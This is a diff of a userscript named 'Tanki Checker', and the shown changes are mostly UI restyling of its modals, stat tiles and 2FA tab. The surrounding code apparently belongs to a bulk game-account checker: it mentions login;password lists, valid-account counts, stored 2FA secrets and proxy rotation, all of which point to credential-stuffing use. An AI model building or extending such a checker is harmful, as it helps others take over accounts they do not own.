+#tc-detail-modal .tc-btn,
+#tc-rubies-add-modal .tc-btn,
+#tc-assets-modal .tc-btn,
+#tc-gold-modal .tc-btn{
+  display:inline-flex;align-items:center;justify-content:center;gap:7px;
+  min-height:34px;padding:0 14px;
+  border-radius:6px;
+  font-size:12px;font-weight:700;letter-spacing:.03em;
+  font-family:inherit;cursor:pointer;
+  border:1px solid transparent;
+  transition:filter .12s ease,background .12s ease,border-color .12s ease;
+  flex:1 1 auto;
+  color:inherit;
+}
+#tc-menu .tc-btn-primary,
+#tc-detail-modal .tc-btn-primary,
+#tc-rubies-add-modal .tc-btn-primary,
+#tc-assets-modal .tc-btn-primary,
+#tc-gold-modal .tc-btn-primary{
+  background:var(--tc-chrome,linear-gradient(135deg,#f4f6fa,#c8cfdc 40%,#9aa5b8 72%,#d8dee8));
+  color:#0a0c10 !important;
+  border-color:rgba(255,255,255,.35);
+  box-shadow:0 1px 0 rgba(255,255,255,.4) inset,0 2px 8px rgba(208,214,224,.15);
+}
+#tc-menu .tc-btn-primary:hover,
+#tc-detail-modal .tc-btn-primary:hover,
+#tc-rubies-add-modal .tc-btn-primary:hover{
+  filter:brightness(1.07);
+}
+#tc-menu .tc-btn-secondary,
+#tc-detail-modal .tc-btn-secondary,
+#tc-rubies-add-modal .tc-btn-secondary,
+#tc-assets-modal .tc-btn-secondary,
+#tc-gold-modal .tc-btn-secondary{
+  background:var(--tc-surface-2,#181c25);
+  color:var(--tc-text,#eef1f6) !important;
+  border-color:var(--tc-border-2,rgba(197,204,216,.28));
+}
+#tc-menu .tc-btn-secondary:hover,
+#tc-detail-modal .tc-btn-secondary:hover,
+#tc-rubies-add-modal .tc-btn-secondary:hover{
+  background:var(--tc-surface-3,#1f2430);
+}
+#tc-menu .tc-btn-danger,
+#tc-detail-modal .tc-btn-danger,
+#tc-rubies-add-modal .tc-btn-danger,
+#tc-assets-modal .tc-btn-danger,
+#tc-gold-modal .tc-btn-danger{
+  background:linear-gradient(180deg,#e85a63,#c43b44);
+  color:#fff !important;
+  border-color:rgba(255,255,255,.15);
+}
+
+#tc-menu .tc-account-card,
+#tc-detail-modal .tc-account-card,
+#tc-assets-modal .tc-account-card,
+#tc-gold-modal .tc-account-card{
+  display:flex;align-items:center;justify-content:space-between;gap:12px;
+  padding:10px 12px;
+  border-radius:8px;
+  background:var(--tc-surface,#12151c);
+  border:1px solid var(--tc-border,rgba(197,204,216,.14));
+  cursor:pointer;
+  transition:border-color .12s ease,background .12s ease;
+  color:var(--tc-text);
+}
+#tc-menu .tc-account-card:hover,
+#tc-assets-modal .tc-account-card:hover,
+#tc-gold-modal .tc-account-card:hover{
+  border-color:var(--tc-border-2,rgba(197,204,216,.28));
+  background:var(--tc-surface-2,#181c25);
+}
+
+/* Filters row */
+#tc-menu .tc-filters{
+  display:flex;flex-wrap:wrap;gap:6px;margin-bottom:12px;
+}
+
+/* Premium / rubies cards on dashboard */
+#tc-menu .tc-prem-card{
+  display:flex;flex-direction:column;gap:8px;
+  padding:12px 14px;
+  border-radius:8px;
+  background:var(--tc-surface);
+  border:1px solid var(--tc-border);
+  border-left:3px solid rgba(208,214,224,.4);
+  transition:border-color .12s ease,background .12s ease;
+}
+#tc-menu .tc-prem-card:hover{
+  border-color:var(--tc-border-2);
+  background:var(--tc-surface-2);
+}
+#tc-menu .tc-prem-top{
+  display:flex;align-items:flex-start;justify-content:space-between;gap:8px;
+}
+#tc-menu .tc-prem-login{
+  font-size:13px;font-weight:750;color:var(--tc-text);
+  overflow:hidden;text-overflow:ellipsis;white-space:nowrap;
+}
+#tc-menu .tc-prem-rank{
+  font-size:10px;font-weight:700;letter-spacing:.06em;text-transform:uppercase;
+  color:var(--tc-text-muted);
+}
+#tc-menu .tc-prem-row{
+  display:flex;flex-wrap:wrap;gap:6px;align-items:center;
+  font-size:11px;color:var(--tc-text-muted);
+}
+#tc-menu .tc-prem-foot{
+  display:flex;align-items:center;justify-content:space-between;gap:8px;
+  font-size:11px;color:var(--tc-text-dim);
+}
+#tc-menu .tc-prem-progress{
+  width:100%;height:4px;border-radius:2px;
+  background:rgba(208,214,224,.08);
+  overflow:hidden;margin-top:2px;
+}
+#tc-menu .tc-prem-progress-bar{
+  height:100%;border-radius:2px;
+  background:linear-gradient(90deg,#9aa5b8,#d0d6e0);
+  box-shadow:0 0 8px rgba(208,214,224,.25);
+}
+
+/* Rubies add modal full */
+#tc-rubies-add-modal .tc-rubies-add-card{
+  width:min(520px,calc(100vw - 24px));
+  max-height:min(86vh,700px);
+  overflow:auto;
+  background:linear-gradient(165deg,#141821,#0e1118);
+  border:1px solid rgba(208,214,224,.2);
+  border-radius:10px;
+  box-shadow:0 24px 64px rgba(0,0,0,.65);
+  padding:0;
+}
+#tc-rubies-add-modal .tc-rubies-add-head,
+#tc-rubies-add-modal .tc-rubies-add-header{
+  display:flex;align-items:flex-start;justify-content:space-between;gap:12px;
+  padding:16px 18px 12px;
+  border-bottom:1px solid rgba(208,214,224,.1);
+}
+#tc-rubies-add-modal .tc-rubies-add-kicker{
+  font-size:9px;font-weight:800;letter-spacing:.14em;text-transform:uppercase;
+  color:var(--tc-text-dim);margin-bottom:4px;
+}
+#tc-rubies-add-modal .tc-rubies-add-title{
+  font-size:15px;font-weight:800;color:var(--tc-text);letter-spacing:.02em;
+}
+#tc-rubies-add-modal .tc-rubies-add-sub{
+  font-size:12px;color:var(--tc-text-muted);margin-top:4px;line-height:1.4;
+}
+#tc-rubies-add-modal .tc-rubies-add-close{
+  width:30px;height:30px;border-radius:6px;flex-shrink:0;
+  border:1px solid rgba(208,214,224,.15);
+  background:rgba(208,214,224,.06);
+  color:var(--tc-text-muted);cursor:pointer;font-size:14px;
+}
+#tc-rubies-add-modal .tc-rubies-add-body{padding:14px 18px}
+#tc-rubies-add-modal .tc-rubies-add-label{
+  font-size:10px;font-weight:800;letter-spacing:.12em;text-transform:uppercase;
+  color:var(--tc-text-dim);margin-bottom:6px;
+}
+#tc-rubies-add-modal .tc-rubies-add-format{
+  font-size:11px;color:var(--tc-text-muted);line-height:1.45;margin:6px 0 10px;
+}
+#tc-rubies-add-modal .tc-rubies-add-preview{
+  font-size:12px;color:var(--tc-text-muted);margin-top:8px;
+  padding:8px 10px;border-radius:6px;
+  background:rgba(208,214,224,.04);border:1px solid rgba(208,214,224,.1);
+}
+#tc-rubies-add-modal .tc-rubies-add-actions{
+  display:flex;gap:8px;padding:12px 18px 16px;
+  border-top:1px solid rgba(208,214,224,.1);
+}
+#tc-rubies-add-modal textarea,
+#tc-rubies-add-modal .tc-import-area{
+  width:100%;min-height:140px;box-sizing:border-box;
+  padding:10px 12px;border-radius:6px;
+  background:var(--tc-surface,#12151c);
+  border:1px solid var(--tc-border,rgba(197,204,216,.14));
+  color:var(--tc-text,#eef1f6);
+  font:12px/1.45 ui-monospace,Consolas,monospace;
+  resize:vertical;outline:none;
+}
+#tc-rubies-add-modal textarea:focus{
+  border-color:rgba(208,214,224,.4);
+  box-shadow:0 0 0 2px rgba(208,214,224,.1);
+}
+
+/* Detail modal content polish */
+#tc-detail-modal .tc-detail-content{
+  width:min(440px,calc(100vw - 24px));
+  max-height:min(80vh,640px);
+  overflow:auto;
+  background:linear-gradient(165deg,#141821,#0e1118);
+  border:1px solid rgba(208,214,224,.2);
+  border-radius:10px;
+  box-shadow:0 24px 64px rgba(0,0,0,.65);
+}
+#tc-detail-modal.show,
+#tc-detail-modal.open{
+  display:flex !important;
+}
+
+/* Status bar */
+#tc-menu #tc-status-bar,
+#tc-menu .tc-status-bar{
+  font-size:11px;color:var(--tc-text-muted);
+  padding:8px 10px;margin-bottom:10px;
+  border-radius:6px;
+  background:var(--tc-surface);
+  border:1px solid var(--tc-border);
+}
+#tc-menu #tc-status-bar .hl{color:var(--tc-accent-strong,#f2f4f8);font-weight:700}
+
+/* Import area alias */
+#tc-menu .tc-import-area{
+  width:100%;min-height:110px;resize:vertical;
+  padding:10px 12px;border-radius:6px;
+  background:var(--tc-surface) !important;
+  border:1px solid var(--tc-border) !important;
+  color:var(--tc-text) !important;
+  font:12px/1.5 ui-monospace,Consolas,monospace;
+  outline:none;
+}
+#tc-menu .tc-import-area:focus{
+  border-color:rgba(208,214,224,.45) !important;
+  box-shadow:0 0 0 2px rgba(208,214,224,.12) !important;
+}
+
+/* 2FA overrides when inline styles inject */
+#tab-twofa .twofa-import-help{font-size:11px;color:var(--tc-text-dim);margin-top:6px;line-height:1.45}
+#tab-twofa .twofa-copy-code,
+#tab-twofa .twofa-del{flex:0 0 auto}
+
+/* Neutralize old proxy injected radius if present */
+#proxy-rotation-settings{
+  margin-top:22px !important;
+  padding:14px !important;
+  border-radius:8px !important;
+  background:var(--tc-surface) !important;
+  border:1px solid var(--tc-border) !important;
+}
+
+
+/* force readable overrides that used to fight each other — single source */
+#tc-menu .tc-tabs,
+#tc-menu .tc-tab,
+#tc-menu .tc-header,
+#tc-menu .tc-tab-content,
+#tc-menu .tc-stat,
+#tc-menu .tc-btn,
+#tc-menu .tc-account-card{transform:none !important}
+`;
         document.head.appendChild(style);
     }
+
 
 
     // =========================================================
@@ -8234,7 +8838,7 @@ async function testDiscordNotification() {
             <aside class="tc-tabs">
                 <div class="tc-brand">
                     <div class="tc-brand-mark">yal</div>
-                    <div class="tc-brand-text"><b>TANKI CHECKER</b><small>1.0.3</small></div>
+                    <div class="tc-brand-text"><b>TANKI CHECKER</b><small>SILVER FROST</small></div>
                 </div>
                 <div class="tc-nav">
                     <div class="tc-nav-label">Main</div>
@@ -8552,33 +9156,33 @@ ivan13000;d1f2y3z4
             modal.className = "tchecker-ui";
             modal.setAttribute("data-theme", CONFIG.THEME || "dark");
             modal.innerHTML = `
-                <div class="tc-detail-content" style="max-width:560px;max-height:80vh;display:flex;flex-direction:column">
-                    <div class="tc-detail-header">
-                        <div class="tc-detail-title">Аккаунты с рубинами / танкоинами</div>
-                        <button class="tc-detail-close" id="assets-modal-close">✕</button>
+                <div class="tc-detail-content" style="max-width:560px;max-height:80vh;display:flex;flex-direction:column;width:min(560px,calc(100vw - 24px));background:linear-gradient(165deg,#141821,#0e1118);border:1px solid rgba(208,214,224,.2);border-radius:10px;box-shadow:0 24px 64px rgba(0,0,0,.65);overflow:hidden">
+                    <div class="tc-detail-header" style="display:flex;align-items:center;justify-content:space-between;padding:14px 16px;border-bottom:1px solid rgba(208,214,224,.12)">
+                        <div class="tc-detail-title" style="font-size:13px;font-weight:800;letter-spacing:.06em;text-transform:uppercase;color:#eef1f6">Аккаунты с рубинами / танкоинами</div>
+                        <button class="tc-detail-close" id="assets-modal-close" type="button" style="width:28px;height:28px;border-radius:6px;border:1px solid rgba(208,214,224,.15);background:rgba(208,214,224,.06);color:#9aa3b2;cursor:pointer;font-size:14px">✕</button>
                     </div>
-                    <div id="assets-modal-list" style="overflow-y:auto;flex:1;padding:4px 0"></div>
+                    <div id="assets-modal-list" style="overflow-y:auto;flex:1;padding:10px 14px 14px;color:#eef1f6"></div>
                 </div>`;
             document.body.appendChild(modal);
-            modal.style.cssText = "position:fixed;inset:0;background:rgba(0,0,0,.75);backdrop-filter:blur(10px);z-index:100001;display:none;align-items:center;justify-content:center;opacity:0;transition:opacity .2s";
             modal.addEventListener("click", e => { if (e.target === modal) closeAssetsModal(); });
-            modal.querySelector("#assets-modal-close").addEventListener("click", closeAssetsModal);
+            modal.querySelector("#assets-modal-close").addEventListener("click", e => { e.stopPropagation(); closeAssetsModal(); });
         }
         modal.setAttribute("data-theme", CONFIG.THEME || "dark");
         const list = getAccountsWithAssets();
         const box = modal.querySelector("#assets-modal-list");
+        if (!box) return;
         if (!list.length) {
             box.innerHTML = `<div class="tc-empty"><h4>Нет аккаунтов</h4><p>Нет валидных аккаунтов с рубинами или танкоинами.</p></div>`;
         } else {
             box.innerHTML = list.map(a => `
-                <div class="tc-account-card" data-login="${escapeHtml(a.login)}" style="cursor:pointer;margin-bottom:8px">
+                <div class="tc-account-card" data-login="${escapeHtml(a.login)}" style="cursor:pointer;margin-bottom:8px;display:flex;align-items:center;justify-content:space-between;gap:12px;padding:10px 12px;border-radius:8px;background:#12151c;border:1px solid rgba(208,214,224,.14);color:#eef1f6">
                     <div>
-                        <div class="login">${escapeHtml(a.username || a.login)}</div>
-                        <div class="details">
-                            <span class="tag">${escapeHtml(a.login)}</span>
-                            <span class="tag">${escapeHtml(a.rank)}</span>
-                            <span class="tag">◆ ${formatAmount(String(a.rubies))}</span>
-                            <span class="tag">🪙 ${formatAmount(String(a.tankoins))}</span>
+                        <div class="login" style="font-size:13px;font-weight:700;color:#eef1f6">${escapeHtml(a.username || a.login)}</div>
+                        <div class="details" style="display:flex;flex-wrap:wrap;gap:4px;margin-top:4px">
+                            <span class="tag" style="display:inline-flex;padding:2px 7px;border-radius:4px;font-size:10px;font-weight:650;background:rgba(208,214,224,.08);border:1px solid rgba(208,214,224,.12);color:#9aa3b2">${escapeHtml(a.login)}</span>
+                            <span class="tag" style="display:inline-flex;padding:2px 7px;border-radius:4px;font-size:10px;font-weight:650;background:rgba(208,214,224,.08);border:1px solid rgba(208,214,224,.12);color:#9aa3b2">${escapeHtml(a.rank)}</span>
+                            <span class="tag" style="display:inline-flex;padding:2px 7px;border-radius:4px;font-size:10px;font-weight:650;background:rgba(208,214,224,.08);border:1px solid rgba(208,214,224,.12);color:#9aa3b2">◆ ${formatAmount(String(a.rubies))}</span>
+                            <span class="tag" style="display:inline-flex;padding:2px 7px;border-radius:4px;font-size:10px;font-weight:650;background:rgba(208,214,224,.08);border:1px solid rgba(208,214,224,.12);color:#9aa3b2">🪙 ${formatAmount(String(a.tankoins))}</span>
                         </div>
                     </div>
                 </div>`).join("");
@@ -8590,16 +9194,35 @@ ivan13000;d1f2y3z4
                 });
             });
         }
-        modal.style.display = "flex";
-        requestAnimationFrame(() => { modal.style.opacity = "1"; });
+        modal.classList.add("show", "open");
+        modal.style.setProperty("position", "fixed", "important");
+        modal.style.setProperty("inset", "0", "important");
+        modal.style.setProperty("z-index", "2147483000", "important");
+        modal.style.setProperty("display", "flex", "important");
+        modal.style.setProperty("align-items", "center", "important");
+        modal.style.setProperty("justify-content", "center", "important");
+        modal.style.setProperty("opacity", "1", "important");
+        modal.style.setProperty("visibility", "visible", "important");
+        modal.style.setProperty("pointer-events", "auto", "important");
+        modal.style.setProperty("background", "rgba(6,8,12,.82)", "important");
+        modal.style.setProperty("backdrop-filter", "blur(14px)", "important");
     }
+
+
 
     function closeAssetsModal() {
         const modal = document.getElementById("tc-assets-modal");
         if (!modal) return;
-        modal.style.opacity = "0";
-        setTimeout(() => { modal.style.display = "none"; }, 200);
+        modal.classList.remove("show", "open");
+        modal.style.setProperty("opacity", "0", "important");
+        modal.style.setProperty("pointer-events", "none", "important");
+        setTimeout(() => {
+            modal.style.setProperty("display", "none", "important");
+            modal.style.setProperty("visibility", "hidden", "important");
+        }, 180);
     }
+
+
 
     function openGoldBoxesModal() {
         let modal = document.getElementById("tc-gold-modal");
@@ -8609,33 +9232,32 @@ ivan13000;d1f2y3z4
             modal.className = "tchecker-ui";
             modal.setAttribute("data-theme", CONFIG.THEME || "dark");
             modal.innerHTML = `
-                <div class="tc-detail-content" style="max-width:560px;max-height:80vh;display:flex;flex-direction:column">
-                    <div class="tc-detail-header">
-                        <div class="tc-detail-title">Аккаунты с золотыми ящиками</div>
-                        <button class="tc-detail-close" id="gold-modal-close">✕</button>
+                <div class="tc-detail-content" style="max-width:560px;max-height:80vh;display:flex;flex-direction:column;width:min(560px,calc(100vw - 24px));background:linear-gradient(165deg,#141821,#0e1118);border:1px solid rgba(208,214,224,.2);border-radius:10px;box-shadow:0 24px 64px rgba(0,0,0,.65);overflow:hidden">
+                    <div class="tc-detail-header" style="display:flex;align-items:center;justify-content:space-between;padding:14px 16px;border-bottom:1px solid rgba(208,214,224,.12)">
+                        <div class="tc-detail-title" style="font-size:13px;font-weight:800;letter-spacing:.06em;text-transform:uppercase;color:#eef1f6">Аккаунты с золотыми ящиками</div>
+                        <button class="tc-detail-close" id="gold-modal-close" type="button" style="width:28px;height:28px;border-radius:6px;border:1px solid rgba(208,214,224,.15);background:rgba(208,214,224,.06);color:#9aa3b2;cursor:pointer;font-size:14px">✕</button>
                     </div>
-                    <div id="gold-modal-list" style="overflow-y:auto;flex:1;padding:4px 0"></div>
+                    <div id="gold-modal-list" style="overflow-y:auto;flex:1;padding:10px 14px 14px;color:#eef1f6"></div>
                 </div>`;
             document.body.appendChild(modal);
-            modal.style.cssText = "position:fixed;inset:0;background:rgba(0,0,0,.75);backdrop-filter:blur(10px);z-index:100001;display:none;align-items:center;justify-content:center;opacity:0;transition:opacity .2s";
             modal.addEventListener("click", e => { if (e.target === modal) closeGoldBoxesModal(); });
-            modal.querySelector("#gold-modal-close").addEventListener("click", closeGoldBoxesModal);
+            modal.querySelector("#gold-modal-close").addEventListener("click", e => { e.stopPropagation(); closeGoldBoxesModal(); });
         }
         modal.setAttribute("data-theme", CONFIG.THEME || "dark");
         const list = getAccountsWithGoldBoxes();
         const box = modal.querySelector("#gold-modal-list");
+        if (!box) return;
         if (!list.length) {
-            box.innerHTML = `<div class="tc-empty"><h4>Нет аккаунтов</h4><p>Нет валидных аккаунтов с золотыми ящиками (или значение ещё не считано).</p></div>`;
+            box.innerHTML = `<div class="tc-empty"><h4>Нет аккаунтов</h4><p>Нет аккаунтов с золотыми ящиками.</p></div>`;
         } else {
             box.innerHTML = list.map(a => `
-                <div class="tc-account-card" data-login="${escapeHtml(a.login)}" style="cursor:pointer;margin-bottom:8px">
+                <div class="tc-account-card" data-login="${escapeHtml(a.login)}" style="cursor:pointer;margin-bottom:8px;display:flex;align-items:center;justify-content:space-between;gap:12px;padding:10px 12px;border-radius:8px;background:#12151c;border:1px solid rgba(208,214,224,.14);color:#eef1f6">
                     <div>
-                        <div class="login">${escapeHtml(a.username || a.login)}</div>
-                        <div class="details">
-                            <span class="tag">${escapeHtml(a.login)}</span>
-                            <span class="tag">${escapeHtml(a.rank)}</span>
-                            <span class="tag">📦 ${formatAmount(String(a.goldBoxes))}</span>
-                            <span class="tag">◆ ${formatAmount(String(a.rubies))}</span>
+                        <div class="login" style="font-size:13px;font-weight:700;color:#eef1f6">${escapeHtml(a.username || a.login)}</div>
+                        <div class="details" style="display:flex;flex-wrap:wrap;gap:4px;margin-top:4px">
+                            <span class="tag" style="display:inline-flex;padding:2px 7px;border-radius:4px;font-size:10px;font-weight:650;background:rgba(208,214,224,.08);border:1px solid rgba(208,214,224,.12);color:#9aa3b2">${escapeHtml(a.login)}</span>
+                            <span class="tag" style="display:inline-flex;padding:2px 7px;border-radius:4px;font-size:10px;font-weight:650;background:rgba(208,214,224,.08);border:1px solid rgba(208,214,224,.12);color:#9aa3b2">${escapeHtml(a.rank)}</span>
+                            <span class="tag" style="display:inline-flex;padding:2px 7px;border-radius:4px;font-size:10px;font-weight:650;background:rgba(208,214,224,.08);border:1px solid rgba(208,214,224,.12);color:#9aa3b2">🟨 ${formatAmount(String(a.goldBoxes))}</span>
                         </div>
                     </div>
                 </div>`).join("");
@@ -8647,16 +9269,35 @@ ivan13000;d1f2y3z4
                 });
             });
         }
-        modal.style.display = "flex";
-        requestAnimationFrame(() => { modal.style.opacity = "1"; });
+        modal.classList.add("show", "open");
+        modal.style.setProperty("position", "fixed", "important");
+        modal.style.setProperty("inset", "0", "important");
+        modal.style.setProperty("z-index", "2147483000", "important");
+        modal.style.setProperty("display", "flex", "important");
+        modal.style.setProperty("align-items", "center", "important");
+        modal.style.setProperty("justify-content", "center", "important");
+        modal.style.setProperty("opacity", "1", "important");
+        modal.style.setProperty("visibility", "visible", "important");
+        modal.style.setProperty("pointer-events", "auto", "important");
+        modal.style.setProperty("background", "rgba(6,8,12,.82)", "important");
+        modal.style.setProperty("backdrop-filter", "blur(14px)", "important");
     }
+
+
 
     function closeGoldBoxesModal() {
         const modal = document.getElementById("tc-gold-modal");
         if (!modal) return;
-        modal.style.opacity = "0";
-        setTimeout(() => { modal.style.display = "none"; }, 200);
+        modal.classList.remove("show", "open");
+        modal.style.setProperty("opacity", "0", "important");
+        modal.style.setProperty("pointer-events", "none", "important");
+        setTimeout(() => {
+            modal.style.setProperty("display", "none", "important");
+            modal.style.setProperty("visibility", "hidden", "important");
+        }, 180);
     }
+
+
 
     // =========================================================
     // RENDER — DASHBOARD
@@ -8703,13 +9344,13 @@ ivan13000;d1f2y3z4
                     <div class="tc-stat-label">Valid</div>
                     <div class="tc-stat-sub">${done} checked</div>
                 </div>
-                <div class="tc-stat" id="tc-stat-rubies-total" style="cursor:pointer" title="Показать аккаунты с рубинами/танкоинами">
+                <div class="tc-stat" id="tc-stat-rubies-total" role="button" tabindex="0" style="cursor:pointer" title="Показать аккаунты с рубинами/танкоинами">
                     <div class="tc-stat-icon">${ICONS.rubies}</div>
                     <div class="tc-stat-value">${formatAmount(String(rubiesTotal))}</div>
                     <div class="tc-stat-label">Total rubies</div>
                     <div class="tc-stat-sub">Нажми · ${assetsCount} акк. с активами</div>
                 </div>
-                <div class="tc-stat" id="tc-stat-gold-total" style="cursor:pointer" title="Показать аккаунты с золотыми ящиками">
+                <div class="tc-stat" id="tc-stat-gold-total" role="button" tabindex="0" style="cursor:pointer" title="Показать аккаунты с золотыми ящиками">
                     <div class="tc-stat-icon">${ICONS.stats}</div>
                     <div class="tc-stat-value">${formatAmount(String(goldTotal))}</div>
                     <div class="tc-stat-label">Total gold boxes</div>
@@ -8746,11 +9387,13 @@ ivan13000;d1f2y3z4
 
         const rubiesStat = document.getElementById("tc-stat-rubies-total");
         if (rubiesStat) {
-            rubiesStat.addEventListener("click", () => openAssetsModal());
+            rubiesStat.onclick = (e) => { e.preventDefault(); e.stopPropagation(); openAssetsModal(); };
+            rubiesStat.onkeydown = (e) => { if (e.key === "Enter" || e.key === " ") { e.preventDefault(); openAssetsModal(); } };
         }
         const goldStat = document.getElementById("tc-stat-gold-total");
         if (goldStat) {
-            goldStat.addEventListener("click", () => openGoldBoxesModal());
+            goldStat.onclick = (e) => { e.preventDefault(); e.stopPropagation(); openGoldBoxesModal(); };
+            goldStat.onkeydown = (e) => { if (e.key === "Enter" || e.key === " ") { e.preventDefault(); openGoldBoxesModal(); } };
         }
 
         const rubiesContainer = document.getElementById("tc-dashboard-rubies");
@@ -9230,7 +9873,6 @@ ivan13000;d1f2y3z4
             showToast(login + ": ОТКЛЮЧЁН", "info");
             return;
         }
-        // DISABLED → ГОТОВ
         st.rubiesEnabled = true;
         st.rubiesStatus = "Не собрано";
         st.rubiesSkipPermanent = false;
@@ -9654,70 +10296,45 @@ ivan13000;d1f2y3z4
         const list = load2FAAccounts();
         el.innerHTML = `
             <style>
-                #tab-twofa .twofa-list{display:flex;flex-direction:column;gap:10px;margin-top:12px;max-height:480px;overflow-y:auto;padding-right:4px;}
+                #tab-twofa .twofa-list{display:flex;flex-direction:column;gap:8px;margin-top:10px;max-height:480px;overflow-y:auto}
                 #tab-twofa .twofa-card{
                     display:grid;
-                    grid-template-columns:minmax(120px,1fr) minmax(160px,200px) auto;
-                    align-items:center;
-                    gap:12px 20px;
-                    padding:16px 18px;
+                    grid-template-columns:minmax(100px,1fr) minmax(150px,190px) auto;
+                    align-items:center;gap:12px;
+                    padding:12px 14px;
                     border:1px solid var(--tc-border);
-                    border-radius:14px;
+                    border-radius:8px;
                     background:var(--tc-surface);
                 }
-                #tab-twofa .twofa-card-name{
-                    font-size:15px;font-weight:700;color:var(--tc-text);
-                    overflow:hidden;text-overflow:ellipsis;white-space:nowrap;
-                }
+                #tab-twofa .twofa-card-name{font-size:13px;font-weight:700;color:var(--tc-text);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
                 #tab-twofa .twofa-otp-box{
                     display:flex;flex-direction:column;align-items:center;justify-content:center;
-                    padding:8px 12px;border-radius:12px;
-                    background:rgba(255,255,255,.03);border:1px solid var(--tc-border);
+                    padding:8px;border-radius:6px;
+                    background:var(--tc-bg);border:1px solid var(--tc-border);
                 }
-                #tab-twofa .twofa-otp-label{
-                    font-size:9px;font-weight:700;text-transform:uppercase;
-                    letter-spacing:.1em;color:var(--tc-text-dim);margin-bottom:4px;
-                }
+                #tab-twofa .twofa-otp-label{font-size:8px;font-weight:800;letter-spacing:.12em;text-transform:uppercase;color:var(--tc-text-dim);margin-bottom:3px}
                 #tab-twofa .twofa-otp-code{
-                    font-size:26px;font-weight:800;font-variant-numeric:tabular-nums;
-                    font-family:ui-monospace,SFMono-Regular,Consolas,monospace;
-                    letter-spacing:.16em;color:var(--tc-text);cursor:pointer;user-select:all;
-                    line-height:1.15;
+                    font-size:22px;font-weight:800;font-variant-numeric:tabular-nums;
+                    font-family:ui-monospace,Consolas,monospace;letter-spacing:.14em;
+                    color:var(--tc-text);cursor:pointer;user-select:all;line-height:1.15;
                 }
-                #tab-twofa .twofa-otp-timer{
-                    font-size:11px;margin-top:4px;font-variant-numeric:tabular-nums;
-                    color:var(--tc-text-muted);
-                }
-                #tab-twofa .twofa-otp-bar{
-                    width:100%;height:3px;margin-top:8px;border-radius:2px;
-                    background:rgba(255,255,255,.08);overflow:hidden;
-                }
-                #tab-twofa .twofa-otp-bar > div{
-                    height:100%;border-radius:2px;background:#50e38b;
-                    transition:width .2s linear,background .2s;
-                }
-                #tab-twofa .twofa-card-actions{display:flex;gap:8px;align-items:center;justify-content:flex-end;}
-                #tab-twofa .twofa-card-actions .tc-btn{
-                    flex:0 0 auto;min-width:72px;height:34px;padding:0 12px;
-                    font-size:12px;border-radius:10px;margin:0;
-                }
-                #tab-twofa .twofa-card-actions .twofa-del{
-                    min-width:34px;width:34px;padding:0;font-size:14px;
-                }
-                #tab-twofa .twofa-import-box{
-                    margin-top:8px;padding:14px;border:1px solid var(--tc-border);
-                    border-radius:12px;background:var(--tc-surface-2);
-                }
+                #tab-twofa .twofa-otp-timer{font-size:10px;margin-top:3px;color:var(--tc-text-muted)}
+                #tab-twofa .twofa-otp-bar{width:100%;height:2px;margin-top:6px;border-radius:1px;background:rgba(208,214,224,.08);overflow:hidden}
+                #tab-twofa .twofa-otp-bar > div{height:100%;background:#d0d6e0;transition:width .2s linear}
+                #tab-twofa .twofa-card-actions{display:flex;gap:6px;align-items:center;justify-content:flex-end}
+                #tab-twofa .twofa-card-actions .tc-btn{flex:0 0 auto;min-width:72px;height:32px;padding:0 12px;font-size:12px;border-radius:6px;margin:0}
+                #tab-twofa .twofa-card-actions .twofa-del{min-width:32px;width:32px;padding:0;font-size:14px}
+                #tab-twofa .twofa-import-box{margin-top:8px;padding:12px;border:1px solid var(--tc-border);border-radius:8px;background:var(--tc-surface)}
                 #tab-twofa .twofa-import-box textarea{
                     width:100%;min-height:90px;box-sizing:border-box;padding:10px;
-                    border-radius:8px;border:1px solid var(--tc-border);
-                    background:var(--tc-surface);color:var(--tc-text);
+                    border-radius:6px;border:1px solid var(--tc-border);
+                    background:var(--tc-bg);color:var(--tc-text);
                     font:12px/1.45 ui-monospace,Consolas,monospace;resize:vertical;
                 }
-                #tab-twofa .twofa-import-help{font-size:11px;color:var(--tc-text-dim);margin-top:6px;line-height:1.45;}
+                #tab-twofa .twofa-import-help{font-size:11px;color:var(--tc-text-dim);margin-top:6px;line-height:1.45}
                 @media(max-width:700px){
-                    #tab-twofa .twofa-card{grid-template-columns:1fr;gap:12px;}
-                    #tab-twofa .twofa-card-actions{justify-content:flex-start;}
+                    #tab-twofa .twofa-card{grid-template-columns:1fr;gap:12px}
+                    #tab-twofa .twofa-card-actions{justify-content:flex-start}
                 }
             </style>
             <div class="tc-section-title">Overview</div>
@@ -9865,7 +10482,7 @@ ivan13000;d1f2y3z4
             }
             listEl.innerHTML = filtered.map(r => {
                 const displayName = r.nickname || r.login || "—";
-                const ver = r.secretVerified ? '<span class="tag" style="margin-left:6px;font-size:10px;color:#50e38b">✓ secret OK</span>' : (r.secret ? '<span class="tag" style="margin-left:6px;font-size:10px;color:#f0b429">? unchecked</span>' : '');
+                const ver = r.secretVerified ? '<span class="tag" style="margin-left:6px;font-size:10px;color:#4fd6a0">✓ secret OK</span>' : (r.secret ? '<span class="tag" style="margin-left:6px;font-size:10px;color:#e6b84d">? unchecked</span>' : '');
                 return `<div class="twofa-card" data-twofa-row data-secret="${escapeHtml(r.secret || "")}">
                     <div class="twofa-card-name" title="${escapeHtml(r.login || "")}">${escapeHtml(displayName)}${ver}</div>
                     <div class="twofa-otp-box">
@@ -10353,7 +10970,7 @@ ivan13000;d1f2y3z4
 
             ${renderProxyRotationBlock()}
 
-            <div class="tc-section-title" style="margin-top:28px;color:#ef5350">⚠ Danger zone</div>
+            <div class="tc-section-title" style="margin-top:28px;color:#f07178">⚠ Danger zone</div>
             <div style="font-size:12px;color:var(--tc-text-dim);line-height:1.55;margin-bottom:12px">
                 Сброс баз: Checker, Daily Rubies, архив, статусы, entrance hash, очередь.
                 <b>Настройки скрипта сохраняются</b> (Discord, theme, interval, auto-rubies…).
@@ -11046,7 +11663,7 @@ ivan13000;d1f2y3z4
             isRunning = true;
             setTimeout(() => { startChecking(); updateUI(); }, 1800);
         }
-        console.log("◆ Tanki Checker + Rubies v1.0.3 started | Mode:", MODE);
+        console.log("◆ Tanki Checker + Rubies v1.1.1 started | Mode:", MODE);
     }
 
     if (document.readyState === "complete") init();
